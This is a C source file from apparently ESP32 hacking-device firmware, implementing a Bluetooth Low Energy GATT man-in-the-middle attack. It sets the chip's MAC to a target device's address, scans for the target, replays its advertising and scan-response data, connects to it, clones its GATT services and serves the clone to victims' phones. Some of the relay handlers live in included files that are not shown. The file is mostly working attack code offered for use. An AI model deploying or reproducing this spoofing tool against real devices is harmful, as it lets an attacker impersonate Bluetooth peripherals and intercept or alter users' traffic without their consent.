
#include "ble/GattAttack.h"
#include "ble/gatt_app_api.h"
#include "ble/ble.h"
#include "cJSON.h"
#include <stdio.h>
#include "ble/payload.h"
#include "uart/uart_bridge.h"
#include "wifi/ws.h"

clone_t clone;
esp_ble_scan_params_t ble_scan_params = {.scan_type = BLE_SCAN_TYPE_ACTIVE,
                                         .own_addr_type = BLE_ADDR_TYPE_PUBLIC,
                                         .scan_filter_policy = BLE_SCAN_FILTER_ALLOW_ALL,
                                         .scan_interval = 0x50,
                                         .scan_window = 0x30,
                                         .scan_duplicate = BLE_SCAN_DUPLICATE_DISABLE};

esp_ble_adv_params_t adv_params = {
    .adv_int_min = 0x20,
    .adv_int_max = 0x20,
    .adv_type = ADV_TYPE_IND,
    .own_addr_type = BLE_ADDR_TYPE_PUBLIC,
    //.peer_addr            =
    //.peer_addr_type       =
    .channel_map = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

#define TAG "GATT Attack"

bool shutdown_gatt_attack = false;
int retries = 0;
int MAX_RETRIES = 3;
bool connected = false;
bool connecting = false;
bool clone_init = false;        // if the cloned gatt structure has been completed
uint8_t service_num = 0;        // number of services found
uint8_t cloned_service_num = 0; // number of cloned services
uint8_t last_end_handle = 0;    // used for calculating the # of handles needed
static prepare_type_env_t prepare_write_env;

// A write response belongs to the original phone request, not the most recent
// read or write-without-response seen on either connection.
typedef struct pending_write_t {
  bool active;
  bool descriptor;
  uint16_t conn_id;
  uint32_t trans_id;
  uint16_t handle;
} pending_write_t;
static pending_write_t pending_write;

static void finish_pending_write(esp_gatt_status_t status) {
  if (!pending_write.active)
    return;
  const pending_write_t request = pending_write;
  pending_write.active = false;
  esp_err_t ret =
      esp_ble_gatts_send_response(clone.gatts_if, request.conn_id, request.trans_id, status, NULL);
  if (ret != ESP_OK)
    ESP_LOGW(TAG, "Write response failed: %s", esp_err_to_name(ret));
}

#include "gatt_utils.inc"

/**
 * server_event
 *
 * Handles the GATT Server
 * events. This is what actually
 * is the copy of the target device
 * and handles connections from
 * victims devices.
 *
 * @param esp_gatts_cb_event_t event
 * @param esp_gatt_if_t gatts_if
 * @param esp_ble_gatts_cb_param_t *param
 */
void server_event(esp_gatts_cb_event_t event, esp_gatt_if_t gatts_if,
                  esp_ble_gatts_cb_param_t *param) {
  switch (event) {
#include "gatt_server_requests.inc"

#include "gatt_server_lifecycle.inc"

  default:
    break;
  }
};

/**
 * client_event
 *
 * Handles the GATT Client
 * events. This is our fake
 * connection to the target
 * device that discovers the
 * services, clones them, and
 * then start the GATT Server.
 *
 * The connection tries to stay
 * open for a number of attempts
 * to and actions as a MITM device.
 *
 * @param esp_gattc_cb_event_t event
 * @param esp_gatt_if_t gattc_if
 * @param esp_ble_gattc_cb_param_t *param
 */
void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if,
                  esp_ble_gattc_cb_param_t *param) {
  switch (event) {
#include "gatt_client_discovery.inc"

#include "gatt_client_requests.inc"

  default:
    break;
  }
}

/**
 * esp_gap_cb
 *
 * Callback for the GAP.
 * This handles scanning
 * for advertisements and
 * spoofing them once found.
 * A GATT Client is then
 * started to connect to the
 * target device to clone the
 * services.
 *
 * @param esp_gap_ble_cb_event_t event
 * @param esp_ble_gap_cb_param_t *param
 */
void esp_gap_cb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
  uint8_t *adv_name = NULL;
  uint8_t adv_name_len = 0;
  switch (event) {
  case ESP_GAP_BLE_SCAN_PARAM_SET_COMPLETE_EVT: {
    esp_ble_gap_start_scanning(30);
    break;
  }
  case ESP_GAP_BLE_SCAN_START_COMPLETE_EVT: {
    if (param->scan_start_cmpl.status != ESP_BT_STATUS_SUCCESS) {
      ESP_LOGE(TAG, "scan start failed, error status = %x", param->scan_start_cmpl.status);
      break;
    }
    gatt_send_output("Scan started", false);
    break;
  }
  case ESP_GAP_BLE_SCAN_RESULT_EVT: {
    switch (param->scan_rst.search_evt) {
    case ESP_GAP_SEARCH_INQ_RES_EVT: {
      if (connecting || connected) {
        break;
      }
      adv_name = esp_ble_resolve_adv_data(param->scan_rst.ble_adv, ESP_BLE_AD_TYPE_NAME_CMPL,
                                          &adv_name_len);
      if (memcmp(clone.target, param->scan_rst.bda, sizeof(esp_bd_addr_t)) == 0) {

        memcpy(clone.target_bda, param->scan_rst.bda, sizeof(esp_bd_addr_t));
        ESP_LOGI(TAG, "Device: ");
        esp_log_buffer_char(TAG, adv_name, adv_name_len);
        esp_log_buffer_hex(TAG, param->scan_rst.bda, 6);
        ESP_LOGI(TAG, "Device Name Len: %d, Adv Data Len: %d, Scan Response Len: %d", adv_name_len,
                 param->scan_rst.adv_data_len, param->scan_rst.scan_rsp_len);

        if (param->scan_rst.adv_data_len > 0) {
          ESP_LOGI(TAG, "adv data:");
          esp_log_buffer_hex(TAG, &param->scan_rst.ble_adv[0], param->scan_rst.adv_data_len);
        }

        if (param->scan_rst.scan_rsp_len > 0) {
          ESP_LOGI(TAG, "scan resp:");
          esp_log_buffer_hex(TAG, &param->scan_rst.ble_adv[param->scan_rst.adv_data_len],
                             param->scan_rst.scan_rsp_len);
        }

        if (!connected || !connecting) {
          connecting = true;
          esp_ble_gap_stop_scanning();

          char device_name[20];
          snprintf(device_name, sizeof(device_name), "%02X:%02X:%02X:%02X:%02X:%02X",
                   clone.target[0], clone.target[1], clone.target[2], clone.target[3],
                   clone.target[4], clone.target[5]);
          esp_err_t set_dev_name_ret = esp_ble_gap_set_device_name(device_name);
          if (set_dev_name_ret) {
            ESP_LOGE(TAG, "set device name failed, error code = %x", set_dev_name_ret);
          }

          esp_err_t raw_adv_ret = esp_ble_gap_config_adv_data_raw(param->scan_rst.ble_adv,
                                                                  param->scan_rst.adv_data_len);
          if (raw_adv_ret) {
            ESP_LOGE(TAG, "config raw adv data failed, error code = %x ", raw_adv_ret);
          }

          if (param->scan_rst.scan_rsp_len > 0) {
            uint8_t *raw_scan_rsp_data = &param->scan_rst.ble_adv[param->scan_rst.adv_data_len];
            esp_err_t raw_scan_ret = esp_ble_gap_config_scan_rsp_data_raw(
                raw_scan_rsp_data, param->scan_rst.scan_rsp_len);
            if (raw_scan_ret) {
              ESP_LOGE(TAG, "config raw scan rsp data failed, error code = %x", raw_scan_ret);
            }
          }

          gatt_send_output("Connecting to target", false);
          gattAttackState = GATT_ATTACK_STATE_CLIENT_CONNECTING;
          gatt_send_state((int)gattAttackState);
          esp_ble_gattc_open(clone.gattc_if, param->scan_rst.bda, param->scan_rst.ble_addr_type,
                             true);
        }
      }
      break;
    }
    case ESP_GAP_SEARCH_INQ_CMPL_EVT: {
      if (!clone_init) {
        shutdown_gatt_attack = true;
        gatt_send_output("Attack Failed :(", false);
        gattAttackState = GATT_ATTACK_STATE_CLIENT_CONNECT_FAIL;
        gatt_send_state((int)gattAttackState);
      }
      break;
    }
    default:
      break;
    }

    break;
  }
  case ESP_GAP_BLE_SCAN_STOP_COMPLETE_EVT: {
    if (param->scan_stop_cmpl.status != ESP_BT_STATUS_SUCCESS) {
      ESP_LOGE(TAG, "scan stop failed, error status = %x", param->scan_stop_cmpl.status);

      break;
    }
    ESP_LOGI(TAG, "stop scan successfully");
    break;
  }
  case ESP_GAP_BLE_ADV_START_COMPLETE_EVT: {
    // advertising start complete event to indicate advertising start successfully or failed
    if (param->adv_start_cmpl.status != ESP_BT_STATUS_SUCCESS) {
      ESP_LOGE(TAG, "Advertising start failed");
    } else {
      gatt_send_output("Advertisment Started. Hack the plan8", false);
    }

    break;
  }
  case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT: {
    if (param->adv_stop_cmpl.status != ESP_BT_STATUS_SUCCESS) {
      ESP_LOGE(TAG, "adv stop failed, error status = %x", param->adv_stop_cmpl.status);
      break;
    }
    break;
  }
  case ESP_GAP_BLE_SCAN_TIMEOUT_EVT: {
    if (!clone_init) {
      gattAttackState = GATT_ATTACK_STATE_FAILED;
      gatt_send_state((int)gattAttackState);
    }
    break;
  }
  default:
    break;
  }
};

/**
 * stop_gatt_attack
 *
 * Handles shutting down
 * connections, created services,
 * resettings application state
 * variables, and finally the deinit
 * the BLE device.
 */
void stop_gatt_attack(void) {
  shutdown_gatt_attack = true;

  esp_err_t ret;
  ret = esp_ble_gap_stop_advertising();
  ret = esp_ble_gap_stop_scanning();
  ret = esp_ble_gattc_close(clone.gattc_if, clone.target_client_conn_id);
  ret = esp_ble_gatts_close(clone.gatts_if, clone.server_conn_id);

  for (size_t i = 0; i < clone.num_services; i++) {
    ret = esp_ble_gatts_stop_service(clone.services[i].service_handle);
    ret = esp_ble_gatts_delete_service(clone.services[i].service_handle);
  }

  ret = esp_ble_gatts_app_unregister(0);
  ret = esp_ble_gattc_app_unregister(0);

  ble_stack_deinit(false);
  free_clone();
  free(prepare_write_env.prepare_buf);
  prepare_write_env = (prepare_type_env_t){0};
  pending_write = (pending_write_t){0};
  connected = false;
  connecting = false;
  clone_init = false;
  retries = 0;
  service_num = 0;
  cloned_service_num = 0;
  last_end_handle = 0;
  shutdown_gatt_attack = false;
  ESP_LOGI(TAG, "Attack Shutdown Complete");
};

/**
 * start_gatt_attack
 *
 * Starts the GATT Attack.
 *
 * Spoofs the BLE mac to the inputs
 * target mac and initialzes the BLE
 * stack.
 *
 * @param uint8_t *target - Target MAC
 */
void start_gatt_attack(uint8_t *target) {
  esp_err_t ret;

  memcpy(clone.target, target, sizeof(esp_bd_addr_t));

  ESP_ERROR_CHECK(esp_iface_mac_addr_set(target, ESP_MAC_BT));

  if (!ble_stack_init()) {
    gattAttackState = GATT_ATTACK_STATE_FAILED;
    gatt_send_state(gattAttackState);
    return;
  }
  ret = esp_ble_gap_register_callback(esp_gap_cb);
  if (ret) {
    ESP_LOGE(TAG, "%s gap register failed, error code = %x", __func__, ret);
    return;
  }

  ret = esp_ble_gattc_register_callback(client_event);
  if (ret) {
    ESP_LOGE(TAG, "%s gattc register failed, error code = %x", __func__, ret);
    return;
  }

  ret = esp_ble_gattc_app_register(0);
  if (ret) {
    ESP_LOGE(TAG, "%s gattc app register failed, error code = %x", __func__, ret);
  }

  esp_err_t local_mtu_ret = esp_ble_gatt_set_local_mtu(500);
  if (local_mtu_ret) {
    ESP_LOGE(TAG, "set local MTU failed, error code = %x", local_mtu_ret);
  }
};
